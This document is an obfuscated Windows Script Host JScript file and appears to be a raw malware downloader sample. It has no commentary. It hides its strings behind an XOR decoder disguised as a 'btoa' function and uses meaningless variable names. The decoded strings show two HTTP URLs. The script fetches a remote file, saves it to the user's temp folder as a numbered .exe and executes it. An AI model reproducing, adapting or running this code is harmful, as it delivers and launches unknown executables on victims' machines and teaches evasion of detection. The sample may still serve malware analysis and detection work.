function btoa(tyroHAR, adulterateCW0, expiateGfd, waylayopu, suavityv98, charyNG9, infallibleDvm, stumpHNt, emendwik, inditee3X, quaffGKS) {
    var prognosticatevUy = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var subsideOhb = String(quaffGKS);
    for (var vilifyVug, roseateQoR, retainerhPI = 0, teemkUD = prognosticatevUy, inclusivevwL = ""; subsideOhb.charAt(retainerhPI | 0) || (teemkUD = "=", 
    retainerhPI % 1); inclusivevwL += teemkUD.charAt(63 & vilifyVug >> 8 - retainerhPI % 1 * 8)) {
        roseateQoR = subsideOhb.charCodeAt(retainerhPI += 3 / 4);
        if (roseateQoR > 255) {
            throw new InvalidCharacterError("'btoa' failed: The string to be encoded contains characters outside of the Latin1 range.");
        }
        vilifyVug = vilifyVug << 8 | roseateQoR;
    }
    return inclusivevwL;
}

var arrogatep78 = function(whetj2o) {
    var pathologicalefJ = "";
    var tyroHAR = "rancordbE";
    var adulterateCW0 = "viscousS2N";
    var expiateGfd = "uncouthBDy";
    var waylayopu = "loquaciouscVS";
    var suavityv98 = "unseemlyL9F";
    var charyNG9 = "axiomVbp";
    var infallibleDvm = "dingyC2a";
    var stumpHNt = "expostulationwA3";
    var emendwik = "rileeFh";
    var inditee3X = "halcyonrXD";
    btoa(tyroHAR, adulterateCW0, expiateGfd, waylayopu, suavityv98, charyNG9, infallibleDvm, stumpHNt, emendwik, inditee3X, [ 6, 145, 140, 249, 45, 96, 15, 69, 61, 78, 56, 57, 215, 129, 38, 197 ]);
    var retrenchYTM = String["sdfadfasdffromChar".slice(10) + "Codedsfadsfasdg".slice(0, 4)];
    for (var railJDV = 0; railJDV < whetj2o.length; railJDV++) {
        var trenchantPSi = [ 6, 145, 140, 249, 45, 96, 15, 69, 61, 78, 56, 57, 215, 129, 38, 197 ];
        pathologicalefJ += retrenchYTM(whetj2o[railJDV] ^ trenchantPSi[railJDV % trenchantPSi.length]);
    }
    return pathologicalefJ;
};

var jocundNb7 = function() {
    var eugenicYTK = function() {
        var disaffectedXs9 = arrogatep78([ 107, 212, 228, 192, 105, 56, 74, 11, 85, 39 ]);
        var blightedGGc = arrogatep78([ 119, 217, 244, 193, 90, 25, 95, 36, 126, 25 ]);
    };
    eugenicYTK.prototype.eIeqPodoNb = function(forsakeNHV) {
        var stratumgTD = arrogatep78([ 69, 227, 233, 152, 89, 5, 64, 39, 87, 43, 91, 77 ]);
        return wsh[stratumgTD](forsakeNHV);
    };
    eugenicYTK.prototype.BKbvGfaY5d = function(forsakeNHV) {
        var stratumgTD = arrogatep78([ 69, 227, 233, 152, 89, 5, 64, 39, 87, 43, 91, 77 ]);
        return WScript[stratumgTD](forsakeNHV);
    };
    return eugenicYTK;
}();

(function() {
    var extolFHk = [ arrogatep78([ 110, 229, 248, 137, 23, 79, 32, 45, 77, 47, 74, 92, 174, 238, 83, 173, 99, 227, 233, 136, 92, 78, 108, 42, 80, 97, 0, 9, 249, 228, 94, 160 ]), arrogatep78([ 110, 229, 248, 137, 23, 79, 32, 45, 77, 47, 84, 74, 184, 246, 71, 171, 114, 226, 234, 159, 3, 3, 96, 40, 18, 118, 8, 23, 178, 249, 67 ]) ];
    var loftySzI = 4194304;
    var outskirtsGM0 = new jocundNb7();
    var vestigeTnF = outskirtsGM0[arrogatep78([ 68, 218, 238, 143, 106, 6, 110, 28, 8, 42 ])];
    var arrogateBxH = vestigeTnF(arrogatep78([ 81, 194, 239, 139, 68, 16, 123, 107, 110, 38, 93, 85, 187 ]));
    var cohortuij = vestigeTnF(arrogatep78([ 75, 194, 212, 180, 97, 82, 33, 29, 112, 2, 112, 109, 131, 209 ]));
    var swerveUy1 = vestigeTnF(arrogatep78([ 71, 213, 195, 189, 111, 78, 92, 49, 79, 43, 89, 84 ]));
    var frontiermMO = arrogateBxH.ExpandEnvironmentStrings(arrogatep78([ 35, 197, 201, 180, 125, 69, 83 ]));
    var cohortyK8 = frontiermMO + loftySzI + arrogatep78([ 40, 244, 244, 156 ]);
    var dissimulatejTx = false;
    var squeamishwK4 = 200;
    for (var amalgamateMda = 0; amalgamateMda < extolFHk.length; amalgamateMda++) {
        try {
            var acrimonyi4u = extolFHk[amalgamateMda];
            cohortuij.open(arrogatep78([ 65, 212, 216 ]), acrimonyi4u, false);
            cohortuij.send();
            if (cohortuij.status == squeamishwK4) {
                try {
                    swerveUy1[arrogatep78([ 105, 225, 233, 151 ])]();
                    swerveUy1.type = 1;
                    swerveUy1[arrogatep78([ 113, 227, 229, 141, 72 ])](cohortuij[arrogatep78([ 116, 244, 255, 137, 66, 14, 124, 32, 127, 33, 92, 64 ])]);
                    var embossXAB = arrogatep78([ 105, 212, 201, 191, 70, 55, 55, 18, 74, 2 ]);
                    var conductWjX = arrogatep78([ 79, 201, 231, 146, 70, 51, 106, 29, 85, 26 ]);
                    var coastXbH = Math.pow(2, 10) * 249;
                    if (swerveUy1.size > coastXbH) {
                        amalgamateMda = extolFHk.length;
                        swerveUy1.position = 0;
                        swerveUy1.saveToFile(cohortyK8, 2);
                        dissimulatejTx = true;
                    }
                } finally {
                    swerveUy1.close();
                }
            }
        } catch (ignored) {}
    }
    if (dissimulatejTx) {
        arrogateBxH[arrogatep78([ 67, 233, 233, 154 ])](frontiermMO + Math.pow(2, 22));
    }
})();